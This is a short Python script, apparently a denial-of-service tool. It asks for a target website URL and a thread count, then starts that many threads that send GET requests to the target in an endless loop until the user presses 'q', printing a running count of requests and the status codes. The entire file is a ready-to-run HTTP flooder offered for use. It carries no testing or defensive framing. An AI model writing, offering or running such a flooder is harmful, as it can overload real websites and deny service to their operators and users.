import requests, threading, keyboard, sys
from colorama import Fore, Style

logo = """
 ▄▀▀▀█▀▀▄  ▄▀▀▀▀▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄     
█    █  ▐ █      █ █      █ █    █      
▐   █     █      █ █      █ ▐    █      
   █      ▀▄    ▄▀ ▀▄    ▄▀     █       
 ▄▀         ▀▀▀▀     ▀▀▀▀     ▄▀▄▄▄▄▄▄▀ 
█                             █         
▐                             ▐         
"""
print(Fore.MAGENTA + logo)
url = input(Fore.CYAN + 'website url > ')
num_threads = int(input(Fore.CYAN + 'amount of threads > '))
stop_program = False
request_count = 0
request_count_lock = threading.Lock()

def send_requests():
    global stop_program
    global request_count
    while not stop_program:
        try:
            response = requests.get(url)
            with request_count_lock:
                request_count += 1
            sys.stdout.write('\r' + Fore.MAGENTA + 'request {} - status: {}'.format(request_count, response.status_code))
            sys.stdout.flush()
        except requests.exceptions.RequestException as e:
            print('\rrequest failed - status: {}'.format(e))
    sys.stdout.write('\r')
    sys.stdout.flush()

threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=send_requests)
    thread.daemon = True
    thread.start()
    threads.append(thread)

print(Fore.CYAN + "press 'q' to stop sending requests")
keyboard.wait("q")
stop_program = True

for thread in threads:
    thread.join()

print(Fore.MAGENTA + "\ntotal requests > ", request_count)
